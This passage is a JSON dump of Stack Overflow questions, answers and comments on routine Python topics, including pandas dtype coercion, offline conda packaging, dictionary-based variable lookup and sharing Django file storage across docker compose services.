and print every 10th line of the file", "body": "<p>this is my code thus far:</p>\n\n<pre><code>with open(\"exam2text.txt\") as fh:\n    for lineno, line in enumerate(fh):\n        if lineno % step == 10:\n            print(line)\n</code></pre>\n\n<p>the second problem im working on is to write a function that accepts two parameters: a string 'filename' and an integer 'frequency.' Frequency will be how often to print a line- hard coded to 10 in the first part.</p>\n\n<p>Any help would be appreciated, thank you.</p>\n"}, {"tags": ["python", "build", "anaconda", "conda"], "comments": [{"owner": {"reputation": 24570, "user_id": 2272172, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/40d9cf17504d06006a0154ef0b332457?s=128&d=identicon&r=PG&f=1", "display_name": "cel", "link": "https://stackoverflow.com/users/2272172/cel"}, "edited": false, "score": 0, "creation_date": 1571903041, "post_id": 58532003, "comment_id": 103395565, "body": "this may be of interest to you: <a href=\"https://github.com/conda/constructor\" rel=\"nofollow noreferrer\">github.com/conda/constructor</a>"}, {"owner": {"reputation": 1138, "user_id": 6793245, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yzbof.jpg?s=128&g=1", "display_name": "orangeInk", "link": "https://stackoverflow.com/users/6793245/orangeink"}, "edited": false, "score": 0, "creation_date": 1571903380, "post_id": 58532003, "comment_id": 103395728, "body": "Similarly there is <a href=\"https://github.com/conda/conda-pack\" rel=\"nofollow noreferrer\">github.com/conda/conda-pack</a> It&#39;s worth noting that conda-pack creates OS specific bundles."}], "owner": {"reputation": 31, "user_id": 12265780, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6bffd1170b0ece8eba1faf8a238acb61?s=128&d=identicon&r=PG&f=1", "display_name": "eKenMC", "link": "https://stackoverflow.com/users/12265780/ekenmc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1360, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1571871697, "creation_date": 1571871697, "question_id": 58532003, "link": "https://stackoverflow.com/questions/58532003/is-there-a-way-to-package-up-conda-dependencies-as-a-zip-file", "title": "Is there a way to package up conda dependencies as a zip file", "body": "<p>I'm trying to use conda for packaging dependencies and environment creation for python packages. However, I have a hard restriction that I have to do this in environments that are offline and can't go into conda-forge to grab the dependencies during the conda package installation. </p>\n\n<p>So the solution that I've currently come up with is in an environment that has access online, I will create a conda environment and install my conda package along with its dependencies. I've set my .condarc so that the pkg_dirs is set to \"./pkgs/win-64\". This way the dependency package .tar.bz2 files are captured in that directory. I then zip up the contents of the \"./pkgs/win-64\" to a file called condaPkgDependencies.zip and pass that to the environments that are offline and don't have access to conda-forge. I extract the condaDependencies.zip to some folder path. And then I run conda index (<a href=\"https://conda.io/projects/conda-build/en/latest/resources/commands/conda-index.html\" rel=\"nofollow noreferrer\">https://conda.io/projects/conda-build/en/latest/resources/commands/conda-index.html</a>)  to create a local channel and point to that local channel when trying to run the conda install on that offline environment. </p>\n\n<p>I was wondering if there was a much cleaner way of handling for this. If I use the default pkg_dirs location I believe that ALL dependencies are stored there so packaging up the default location will contain some conda dependencies I do not need. </p>\n\n<p>I've also looked at <a href=\"https://docs.conda.io/projects/conda/en/latest/user-guide/tasks/manage-environments.html#sharing-an-environment\" rel=\"nofollow noreferrer\">https://docs.conda.io/projects/conda/en/latest/user-guide/tasks/manage-environments.html#sharing-an-environment</a> but I don't think this solves my issue of packaging up dependencies for offline mode installation.</p>\n\n<p>Here is what I've added to my .condarc</p>\n\n<p>pkgs_dirs:\n  - ./pkgs/win-64</p>\n"}, {"tags": ["python", "pandas", "coercion"], "comments": [{"owner": {"reputation": 43491, "user_id": 4001592, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HWyjo.jpg?s=128&g=1", "display_name": "Dani Mesejo", "link": "https://stackoverflow.com/users/4001592/dani-mesejo"}, "edited": false, "score": 0, "creation_date": 1571874661, "post_id": 58531998, "comment_id": 103388269, "body": "I found <a href=\"https://github.com/pandas-dev/pandas/issues/11617\" rel=\"nofollow noreferrer\">this</a>, but I could not found if effectively the issue was solved. In the mean time I guess you could do: <code>df.loc[[0], df.columns]</code>"}, {"owner": {"reputation": 6107, "user_id": 7851470, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d10f0dc1bc1f340708d6f6b4c8ec3866?s=128&d=identicon&r=PG&f=1", "display_name": "Georgy", "link": "https://stackoverflow.com/users/7851470/georgy"}, "edited": false, "score": 1, "creation_date": 1573135110, "post_id": 58531998, "comment_id": 103788863, "body": "Duplicates? <a href=\"https://stackoverflow.com/q/43366763/7851470\">.loc indexing changes type</a> &amp; <a href=\"https://stackoverflow.com/q/22044766/7851470\">Adding row to pandas DataFrame changes dtype</a>."}, {"owner": {"reputation": 676, "user_id": 5252522, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-TLdtyS7mY7A/AAAAAAAAAAI/AAAAAAAAAnI/iDfBO_ux0Bo/photo.jpg?sz=128", "display_name": "Quentin", "link": "https://stackoverflow.com/users/5252522/quentin"}, "edited": false, "score": 0, "creation_date": 1573249648, "post_id": 58531998, "comment_id": 103834331, "body": "Sounds like pd.DataFrame doesn&#39;t support type mixing on instantiation?  <a href=\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.html\" rel=\"nofollow noreferrer\">pandas.pydata.org/pandas-docs/stable/reference/api/&hellip;</a>  dtype param only supports a single type.  <code>.read_[type]</code> supports multiple dtypes though..."}], "answers": [{"comments": [{"owner": {"reputation": 676, "user_id": 5252522, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-TLdtyS7mY7A/AAAAAAAAAAI/AAAAAAAAAnI/iDfBO_ux0Bo/photo.jpg?sz=128", "display_name": "Quentin", "link": "https://stackoverflow.com/users/5252522/quentin"}, "edited": false, "score": 0, "creation_date": 1573249836, "post_id": 58532682, "comment_id": 103834392, "body": "You could always just coerce post append <code>df[&#39;a&#39;] = df.a.astype(mytype)</code>... It&#39;s still dirty though and probably not efficient."}, {"owner": {"reputation": 46860, "user_id": 4333359, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/231e42e97a07b2937c1bf8a313dfa3f7?s=128&d=identicon&r=PG&f=1", "display_name": "ALollz", "link": "https://stackoverflow.com/users/4333359/alollz"}, "edited": false, "score": 0, "creation_date": 1573489611, "post_id": 58532682, "comment_id": 103890014, "body": "<code>.astype()</code> is dangerous for float -&gt; integer; it has no problem changing <code>1.1</code> to <code>1</code>, so you really need to be sure all of your values are &#39;integer-like&#39; before doing it. Probably best to use <code>pd.to_numeric</code> with <code>downcast=&#39;integer&#39;</code>"}], "tags": [], "owner": {"reputation": 34066, "user_id": 327026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/08ad5928b416f9de4bb957ac8189bf00?s=128&d=identicon&r=PG", "display_name": "Mike T", "link": "https://stackoverflow.com/users/327026/mike-t"}, "is_accepted": false, "score": 4, "last_activity_date": 1571878104, "creation_date": 1571878104, "answer_id": 58532682, "question_id": 58531998, "link": "https://stackoverflow.com/questions/58531998/prevent-coercion-of-pandas-data-frames-while-indexing-and-inserting-rows/58532682#58532682", "title": "Prevent coercion of pandas data frames while indexing and inserting rows", "body": "<p>After some digging, here are some terribly ugly workarounds. (A better answer will be accepted.)</p>\n\n<p>A quirk <a href=\"https://github.com/pandas-dev/pandas/issues/11617#issuecomment-216767947\" rel=\"nofollow noreferrer\">found here</a> is that non-numeric columns stops coercion, so here is how to index one row to a <code>dict</code>:</p>\n\n<pre><code>dict(df.assign(_='').loc[0].drop('_', axis=0))\n# {'a': 1, 'b': 2.2}\n</code></pre>\n\n<p>And inserting a row can be done by creating a new data frame with one row:</p>\n\n<pre><code>df = df.append(pd.DataFrame({'a': 5, 'b': 4.4}, index=[1]))\nprint(df)\n#    a    b\n# 0  1  2.2\n# 1  5  4.4\n</code></pre>\n\n<p>Both of these tricks are not optimised for large data frames, so I would greatly appreciate a better answer!</p>\n"}, {"comments": [{"owner": {"reputation": 34066, "user_id": 327026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/08ad5928b416f9de4bb957ac8189bf00?s=128&d=identicon&r=PG", "display_name": "Mike T", "link": "https://stackoverflow.com/users/327026/mike-t"}, "edited": false, "score": 0, "creation_date": 1573518093, "post_id": 58714507, "comment_id": 103900161, "body": "Good idea to use <code>object</code> data types! Another one is to create an object DataFrame from the beginning: <code>df = pd.DataFrame({&#39;a&#39;: [1], &#39;b&#39;: [2.2]}, dtype=object)</code>"}], "tags": [], "owner": {"reputation": 627, "user_id": 11978627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4449846c489d54edc7b4737fa726ca5f?s=128&d=identicon&r=PG&f=1", "display_name": "Hongpei", "link": "https://stackoverflow.com/users/11978627/hongpei"}, "is_accepted": false, "score": 2, "last_activity_date": 1572967518, "creation_date": 1572967518, "answer_id": 58714507, "question_id": 58531998, "link": "https://stackoverflow.com/questions/58531998/prevent-coercion-of-pandas-data-frames-while-indexing-and-inserting-rows/58714507#58714507", "title": "Prevent coercion of pandas data frames while indexing and inserting rows", "body": "<p>The root of the problem is that </p>\n\n<ol>\n<li>The indexing of pandas dataframe returns a pandas series</li>\n</ol>\n\n<p>We can see that:</p>\n\n<pre><code>type(df.loc[0])\n# pandas.core.series.Series\n</code></pre>\n\n<p>And a series can only have one dtype, in your case either int64 or float64.</p>\n\n<p>There are two workarounds come to my head:</p>\n\n<pre><code>print(df.loc[[0]])\n# this will return a dataframe instead of series\n# so the result will be\n#    a    b\n# 0  1  2.2\n\n# but the dictionary is hard to read\nprint(dict(df.loc[[0]]))\n# {'a': 0    1\n# Name: a, dtype: int64, 'b': 0    2.2\n# Name: b, dtype: float64}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>print(df.astype(object).loc[0])\n# this will change the type of value to object first and then print\n# so the result will be\n# a      1\n# b    2.2\n# Name: 0, dtype: object\n\nprint(dict(df.astype(object).loc[0]))\n# in this way the dictionary is as expected\n# {'a': 1, 'b': 2.2}\n</code></pre>\n\n<ol start=\"2\">\n<li>When you append a dictionary to a dataframe, it will convert the dictionary to a <strong>Series</strong> first and then append. (So the same problem happens again)</li>\n</ol>\n\n<p><a href=\"https://github.com/pandas-dev/pandas/blob/master/pandas/core/frame.py#L6973\" rel=\"nofollow noreferrer\">https://github.com/pandas-dev/pandas/blob/master/pandas/core/frame.py#L6973</a></p>\n\n<pre><code>if isinstance(other, dict):\n    other = Series(other)\n</code></pre>\n\n<p>So your walkaround is actually a solid one, or else we could:</p>\n\n<pre><code>df.append(pd.Series({'a': 5, 'b': 4.4}, dtype=object, name=1))\n#    a    b\n# 0  1  2.2\n# 1  5  4.4\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 46860, "user_id": 4333359, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/231e42e97a07b2937c1bf8a313dfa3f7?s=128&d=identicon&r=PG&f=1", "display_name": "ALollz", "link": "https://stackoverflow.com/users/4333359/alollz"}, "is_accepted": false, "score": 0, "last_activity_date": 1573159732, "creation_date": 1573159732, "answer_id": 58756698, "question_id": 58531998, "link": "https://stackoverflow.com/questions/58531998/prevent-coercion-of-pandas-data-frames-while-indexing-and-inserting-rows/58756698#58756698", "title": "Prevent coercion of pandas data frames while indexing and inserting rows", "body": "<p>In the first case, you can work with the <a href=\"https://pandas.pydata.org/pandas-docs/stable/user_guide/integer_na.html#nullable-integer-data-type\" rel=\"nofollow noreferrer\">nullable integer data type</a>. The Series selection doesn't coerce to <code>float</code> and values are placed in an <code>object</code> container. The dictionary is then properly created, with the underlying value stored as a <code>np.int64</code>.</p>\n\n<pre><code>df = pd.DataFrame({'a': [1], 'b': [2.2]})\ndf['a'] = df['a'].astype('Int64')\n\nd = dict(df.loc[0])\n#{'a': 1, 'b': 2.2}\n\ntype(d['a'])\n#numpy.int64\n</code></pre>\n\n<p>With your syntax, this <em>almost</em> works for the second case too, but this upcasts to <code>object</code>, so not great:</p>\n\n<pre><code>df.loc[1] = {'a': 5, 'b': 4.4}\n#   a    b\n#0  1  2.2\n#1  5  4.4\n\ndf.dtypes\n#a     object\n#b    float64\n#dtype: object\n</code></pre>\n\n<p>However, we can make a small change to the syntax for adding a row at the end (with a RangeIndex) and now types are dealt with properly. </p>\n\n<pre><code>df = pd.DataFrame({'a': [1], 'b': [2.2]})\ndf['a'] = df['a'].astype('Int64')\n\ndf.loc[df.shape[0], :] = [5, 4.4]\n#   a    b\n#0  1  2.2\n#1  5  4.4\n\ndf.dtypes\n#a      Int64\n#b    float64\n#dtype: object\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4314, "user_id": 5152563, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/ca2290acd27712398ff5bf1d469129dd?s=128&d=identicon&r=PG", "display_name": "Quickbeam2k1", "link": "https://stackoverflow.com/users/5152563/quickbeam2k1"}, "is_accepted": false, "score": 1, "last_activity_date": 1573161044, "creation_date": 1573161044, "answer_id": 58756945, "question_id": 58531998, "link": "https://stackoverflow.com/questions/58531998/prevent-coercion-of-pandas-data-frames-while-indexing-and-inserting-rows/58756945#58756945", "title": "Prevent coercion of pandas data frames while indexing and inserting rows", "body": "<p>A different approach with slight data manipulations:</p>\n\n<p>Assume you have a list of dictionaries (or dataframes)</p>\n\n<p><code>lod=[{'a': [1], 'b': [2.2]},  {'a': [5], 'b': [4.4]}]</code></p>\n\n<p>where each dictionary represents a row (note the lists in the second dictionary). Then you can create a dataframe easily via:</p>\n\n<pre><code>pd.concat([pd.DataFrame(dct) for dct in lod])\n   a    b\n0  1  2.2\n0  5  4.4\n</code></pre>\n\n<p>and you maintain the types of the columns. See <a href=\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.concat.html\" rel=\"nofollow noreferrer\">concat</a></p>\n\n<p>So if you have a dataframe and a list of dicts, you could just use  </p>\n\n<pre><code>pd.concat([df] + [pd.DataFrame(dct) for dct in lod])\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 679, "user_id": 5083114, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Rtl7N.jpg?s=128&g=1", "display_name": "VanBantam", "link": "https://stackoverflow.com/users/5083114/vanbantam"}, "edited": false, "score": 0, "creation_date": 1573496880, "post_id": 58776321, "comment_id": 103893114, "body": "Wow had to read that second code block three times to get it.  That is very subtle.  This is much better than what I&#39;ve done in the past... loop through the final dataframe and reassign the values with the correct data type (yes what I did is a horrible solution that really won&#39;t scale.)."}, {"owner": {"reputation": 7667, "user_id": 5120049, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QQ912.jpg?s=128&g=1", "display_name": "Vishnudev", "link": "https://stackoverflow.com/users/5120049/vishnudev"}, "reply_to_user": {"reputation": 679, "user_id": 5083114, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Rtl7N.jpg?s=128&g=1", "display_name": "VanBantam", "link": "https://stackoverflow.com/users/5083114/vanbantam"}, "edited": false, "score": 1, "creation_date": 1573497133, "post_id": 58776321, "comment_id": 103893227, "body": "Oh. Glad it helped \ud83d\ude0a @VanBantam"}], "tags": [], "owner": {"reputation": 7667, "user_id": 5120049, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QQ912.jpg?s=128&g=1", "display_name": "Vishnudev", "link": "https://stackoverflow.com/users/5120049/vishnudev"}, "is_accepted": false, "score": 3, "last_activity_date": 1573272840, "last_edit_date": 1573272840, "creation_date": 1573272526, "answer_id": 58776321, "question_id": 58531998, "link": "https://stackoverflow.com/questions/58531998/prevent-coercion-of-pandas-data-frames-while-indexing-and-inserting-rows/58776321#58776321", "title": "Prevent coercion of pandas data frames while indexing and inserting rows", "body": "<p>Whenever you are getting data from dataframe or appending data to a dataframe and need to keep the data type same, avoid conversion to other internal structures which are not aware of the data types needed.</p>\n\n<p>When you do <code>df.loc[0]</code> it converts to <a href=\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.Series.html\" rel=\"nofollow noreferrer\"><code>pd.Series</code></a>,</p>\n\n<pre><code>&gt;&gt;&gt; type(df.loc[0])\n&lt;class 'pandas.core.series.Series'&gt;\n</code></pre>\n\n<p>And now, <code>Series</code> will only have a single <code>dtype</code>. Thus coercing <code>int</code> to <code>float</code>.</p>\n\n<p>Instead keep structure as <a href=\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.html\" rel=\"nofollow noreferrer\"><code>pd.DataFrame</code></a>,</p>\n\n<pre><code>&gt;&gt;&gt; type(df.loc[[0]])\n&lt;class 'pandas.core.frame.DataFrame'&gt;\n</code></pre>\n\n<p>Select row needed as a frame and then convert to <code>dict</code></p>\n\n<pre><code>&gt;&gt;&gt; df.loc[[0]].to_dict(orient='records')\n[{'a': 1, 'b': 2.2}]\n</code></pre>\n\n<p>Similarly, to add a new row, Use pandas <a href=\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.append.html\" rel=\"nofollow noreferrer\"><code>pd.DataFrame.append</code></a> function,</p>\n\n<pre><code>&gt;&gt;&gt; df = df.append([{'a': 5, 'b': 4.4}]) # NOTE: To append as a row, use []\n   a    b\n0  1  2.2\n0  5  4.4\n</code></pre>\n\n<p>The above will not cause type conversion,</p>\n\n<pre><code>&gt;&gt;&gt; df.dtypes\na      int64\nb    float64\ndtype: object\n</code></pre>\n"}], "owner": {"reputation": 34066, "user_id": 327026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/08ad5928b416f9de4bb957ac8189bf00?s=128&d=identicon&r=PG", "display_name": "Mike T", "link": "https://stackoverflow.com/users/327026/mike-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 558, "favorite_count": 0, "answer_count": 5, "score": 17, "last_activity_date": 1573272840, "creation_date": 1571871639, "question_id": 58531998, "link": "https://stackoverflow.com/questions/58531998/prevent-coercion-of-pandas-data-frames-while-indexing-and-inserting-rows", "title": "Prevent coercion of pandas data frames while indexing and inserting rows", "body": "<p>I'm working with individual rows of pandas data frames, but I'm stumbling over coercion issues while indexing and inserting rows. Pandas seems to always want to coerce from a mixed int/float to all-float types, and I can't see any obvious controls on this behaviour.</p>\n\n<p>For example, here is a simple data frame with <code>a</code> as <code>int</code> and <code>b</code> as <code>float</code>:</p>\n\n<pre><code>import pandas as pd\npd.__version__  # '0.25.2'\n\ndf = pd.DataFrame({'a': [1], 'b': [2.2]})\nprint(df)\n#    a    b\n# 0  1  2.2\nprint(df.dtypes)\n# a      int64\n# b    float64\n# dtype: object\n</code></pre>\n\n<p>Here is a coercion issue while indexing one row:</p>\n\n<pre><code>print(df.loc[0])\n# a    1.0\n# b    2.2\n# Name: 0, dtype: float64\nprint(dict(df.loc[0]))\n# {'a': 1.0, 'b': 2.2}\n</code></pre>\n\n<p>And here is a coercion issue while inserting one row:</p>\n\n<pre><code>df.loc[1] = {'a': 5, 'b': 4.4}\nprint(df)\n#      a    b\n# 0  1.0  2.2\n# 1  5.0  4.4\nprint(df.dtypes)\n# a    float64\n# b    float64\n# dtype: object\n</code></pre>\n\n<p>In both instances, I want the <code>a</code> column to remain as an integer type, rather than being coerced to a float type.</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 548, "user_id": 2491299, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a4ecb7532bd59de4d1ae7c31b9b2bcb0?s=128&d=identicon&r=PG", "display_name": "JPeroutek", "link": "https://stackoverflow.com/users/2491299/jperoutek"}, "edited": false, "score": 0, "creation_date": 1571871747, "post_id": 58531973, "comment_id": 103387708, "body": "What you\u2019re trying to do would be better accomplished by a list or dict. Consult the online documentation."}, {"owner": {"reputation": 112, "user_id": 9336080, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-_yXIi3cPKEk/AAAAAAAAAAI/AAAAAAAAAPM/AHyRIUzK99g/photo.jpg?sz=128", "display_name": "Matthew Wachter", "link": "https://stackoverflow.com/users/9336080/matthew-wachter"}, "edited": false, "score": 1, "creation_date": 1571871794, "post_id": 58531973, "comment_id": 103387720, "body": "Are you getting an error? Maybe you just need to cast newPlot to a str? <code>posttochange = &quot;pos&quot;+str(newPlot)</code>"}], "answers": [{"comments": [{"owner": {"reputation": 1609, "user_id": 9028015, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CsPp0.jpg?s=128&g=1", "display_name": "Mason Caiby", "link": "https://stackoverflow.com/users/9028015/mason-caiby"}, "reply_to_user": {"reputation": 23, "user_id": 9761643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-aw_Zr91nf88/AAAAAAAAAAI/AAAAAAAAAIE/G8fEF7NsEEk/photo.jpg?sz=128", "display_name": "HelpMeGame", "link": "https://stackoverflow.com/users/9761643/helpmegame"}, "edited": false, "score": 0, "creation_date": 1571871976, "post_id": 58532019, "comment_id": 103387756, "body": "make sure the <code>user_number</code> is a <code>string</code> not an int"}, {"owner": {"reputation": 23, "user_id": 9761643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-aw_Zr91nf88/AAAAAAAAAAI/AAAAAAAAAIE/G8fEF7NsEEk/photo.jpg?sz=128", "display_name": "HelpMeGame", "link": "https://stackoverflow.com/users/9761643/helpmegame"}, "edited": false, "score": 0, "creation_date": 1571872632, "post_id": 58532019, "comment_id": 103387886, "body": "This works, had to change some other stuff in the script but it works fine. Thanks for the help"}], "tags": [], "owner": {"reputation": 1609, "user_id": 9028015, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CsPp0.jpg?s=128&g=1", "display_name": "Mason Caiby", "link": "https://stackoverflow.com/users/9028015/mason-caiby"}, "is_accepted": true, "score": 1, "last_activity_date": 1571871958, "last_edit_date": 1571871958, "creation_date": 1571871802, "answer_id": 58532019, "question_id": 58531973, "link": "https://stackoverflow.com/questions/58531973/how-to-set-my-input-to-an-already-existing-variable-in-python/58532019#58532019", "title": "How to set my input to an already existing variable in Python?", "body": "<p>Can you instead use a dictionary of values e.g.:</p>\n\n<pre><code>pos_s = {'pos1':None,\n         'pos2':None}\n\npos_s['pos'+str(user_number)] = desired_value\n</code></pre>\n\n<p>then to get the value of the variable you would do this:</p>\n\n<p><code>pos_s.get('pos'+str(user_number), None)</code></p>\n"}, {"tags": [], "owner": {"reputation": 186, "user_id": 9727376, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-I3XDxwAwvms/AAAAAAAAAAI/AAAAAAAAC80/h5w76sa2WE0/photo.jpg?sz=128", "display_name": "Francisco Melo junior", "link": "https://stackoverflow.com/users/9727376/francisco-melo-junior"}, "is_accepted": false, "score": 0, "last_activity_date": 1571872998, "creation_date": 1571872998, "answer_id": 58532157, "question_id": 58531973, "link": "https://stackoverflow.com/questions/58531973/how-to-set-my-input-to-an-already-existing-variable-in-python/58532157#58532157", "title": "How to set my input to an already existing variable in Python?", "body": "<p>just complementing Mason Caiby's answer, if the final user can only enter a finite collection of values, I would validate the entry with a <a href=\"https://www.geeksforgeeks.org/sets-in-python/\" rel=\"nofollow noreferrer\">set</a>. \nThen you can associate/correspond to a variable that you <em>already</em> have.</p>\n\n<pre><code>\n# Python program to demonstrate differences \n# between normal and frozen set \n\n# Same as {\"a\", \"b\",\"c\"} \nnormal_set = set([\"a\", \"b\",\"c\"]) \n\n# Adding an element to normal set is fine \nnormal_set.add(\"d\") \n\nprint(\"Normal Set\") \nprint(normal_set) \n\n# A frozen set \nfrozen_set = frozenset([\"e\", \"f\", \"g\"]) \n\nprint(\"Frozen Set\") \nprint(frozen_set) \n\n# Uncommenting below line would cause error as \n# we are trying to add element to a frozen set \n# frozen_set.add(\"h\") \n\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 9761643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-aw_Zr91nf88/AAAAAAAAAAI/AAAAAAAAAIE/G8fEF7NsEEk/photo.jpg?sz=128", "display_name": "HelpMeGame", "link": "https://stackoverflow.com/users/9761643/helpmegame"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 366, "favorite_count": 0, "accepted_answer_id": 58532019, "answer_count": 2, "score": 0, "last_activity_date": 1571872998, "creation_date": 1571871491, "question_id": 58531973, "link": "https://stackoverflow.com/questions/58531973/how-to-set-my-input-to-an-already-existing-variable-in-python", "title": "How to set my input to an already existing variable in Python?", "body": "<p>I'm relatively new to python, and I can't figure out how to do this. I need to take a number input from a user, then turn that into an already existing variable. So far, I've managed to take the input, but I don't think I can make it into a variable. I am trying to turn this said input (number) to be added onto the back of a string (the string is pos) </p>\n\n<p>So, for example, If I entered the number 1, i would have pos1, 2 would be pos2, so on.</p>\n\n<pre><code>if win == 0:\n    displayboard()\n    newPlot = input(\"\")\n    postochange = \"pos\"+newPlot\n    if postochange == \"X\" or \"O\":\n        print (\"Sorry, but that space is taken!\")\n    else:\n        if playerTurn == 1:\n            postochange = \"X\"\n        else:\n            postochange = \"O\"\n</code></pre>\n\n<p>I'll try to simplify this some more, I want to have the user give me a number, that I add to the text \"pos\" and that corresponds to a variable that I <strong><em>already</em></strong> have.</p>\n"}, {"tags": ["python", "django", "api", "docker", "worker"], "answers": [{"tags": [], "owner": {"reputation": 12105, "user_id": 6043170, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-iFy-IHfVniw/AAAAAAAAAAI/AAAAAAAAAFM/f_Xao2r127I/photo.jpg?sz=128", "display_name": "2ps", "link": "https://stackoverflow.com/users/6043170/2ps"}, "is_accepted": false, "score": 2, "last_activity_date": 1573534625, "creation_date": 1573534625, "answer_id": 58812276, "question_id": 58531963, "link": "https://stackoverflow.com/questions/58531963/how-to-use-django-file-storage-to-share-files-between-an-api-and-a-worker/58812276#58812276", "title": "How to Use Django File Storage to Share Files Between an API and a Worker", "body": "<p>If you're in docker compose, just create a shared docker volume between your api and worker and mount it at a well-known point in both containers, like <code>/mnt/share</code>.  Make sure to save the files there in the API and then the worker can access them using the same model since the settings (e.g., <code>MEDIA_ROOT</code>) will point both the API and the Worker to <code>/mnt/share</code>.</p>\n"}], "owner": {"reputation": 111, "user_id": 1941720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f797d43c96e3077faf18f476402561d?s=128&d=identicon&r=PG", "display_name": "GenericDeveloper", "link": "https://stackoverflow.com/users/1941720/genericdeveloper"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 403, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1573534625, "creation_date": 1571871401, "question_id": 58531963, "link": "https://stackoverflow.com/questions/58531963/how-to-use-django-file-storage-to-share-files-between-an-api-and-a-worker", "title": "How to Use Django File Storage to Share Files Between an API and a Worker", "body": "<h1>Goal</h1>\n\n<p>I want to build a local docker compose deployment such that I have 5 services.</p>\n\n<ul>\n<li>Redis</li>\n<li>Postgres</li>\n<li>RabbitMQ</li>\n<li>Django API</li>\n<li>Django Worker</li>\n</ul>\n\n<p>In this deployment the user uploads a file via the API endpoint. This endpoint will store the file in a <code>FileField</code> field in a model.</p>\n\n<p>In a separate transaction the user will trigger an asynchronous task via a separate endpoint. This task will be responsible for</p>\n\n<ul>\n<li>downloading the file</li>\n<li>extracting the file</li>\n<li>kicking of sub tasks to perform <code>intermediate processing steps</code></li>\n<li>upload the results of the processing to the database</li>\n</ul>\n\n<p>The <code>intermediate processing steps</code> are NOT supposed to upload any of the files to the database.</p>\n\n<p>The <code>intermediate processing steps</code> are to use django's internal file storage solution to download and upload files there. This is implemented with a file system hierarchy that is not relevant to this question.</p>\n\n<h1>The Problem</h1>\n\n<p>I have managed to get my local file system working with this configuration. If I run the backend of <code>redis</code>, <code>postgres</code>, and <code>rabbitmq</code>. And then, I run the API and Worker on my machine locally everything runs fine.</p>\n\n<p>When I create a <code>docker-compose</code> configuration and decouple everything. The operation seems to break. And in my docker-compose logging, what I see it:</p>\n\n<pre><code>worker_1  | [2019-10-23 22:27:34,626: WARNING/ForkPoolWorker-2] //--------------------------------------------------------------------------------\nworker_1  | [2019-10-23 22:27:34,627: WARNING/ForkPoolWorker-2] // BEGINNING TASK\nworker_1  | [2019-10-23 22:27:34,627: WARNING/ForkPoolWorker-2] //--------------------------------------------------------------------------------\nworker_1  | [2019-10-23 22:27:34,628: WARNING/ForkPoolWorker-2] // Root Job - 183916ca-f6e6-4e7c-a997-e8f516ccf8be\nworker_1  | [2019-10-23 22:27:34,628: WARNING/ForkPoolWorker-2] // Parent Job - None\nworker_1  | [2019-10-23 22:27:34,628: WARNING/ForkPoolWorker-2] // Current Job - 183916ca-f6e6-4e7c-a997-e8f516ccf8be\nworker_1  | [2019-10-23 22:27:34,628: WARNING/ForkPoolWorker-2] //--------------------------------------------------------------------------------\nworker_1  | [2019-10-23 22:27:34,629: WARNING/ForkPoolWorker-2] // PERFORMING DATA SET PRE PROCESSING\nworker_1  | [2019-10-23 22:27:34,629: WARNING/ForkPoolWorker-2] //--------------------------------------------------------------------------------\nworker_1  | [2019-10-23 22:27:34,629: WARNING/ForkPoolWorker-2] {'data_set_id': 1, 'starting_node': 'Live', 'organization_id': 1}\nworker_1  | [2019-10-23 22:27:34,630: WARNING/ForkPoolWorker-2] Downloading the files required to run!\nworker_1  | [2019-10-23 22:27:34,645: WARNING/ForkPoolWorker-2] Downloading remote file `organizations/1/data_sets/flow_cytometry/triple_hello_world_payload.tgz`\nworker_1  | [2019-10-23 22:27:34,646: WARNING/ForkPoolWorker-2] Exists: `False`\nworker_1  | [2019-10-23 22:27:34,646: WARNING/ForkPoolWorker-2] ERROR occured: [Errno 2] No such file or directory: 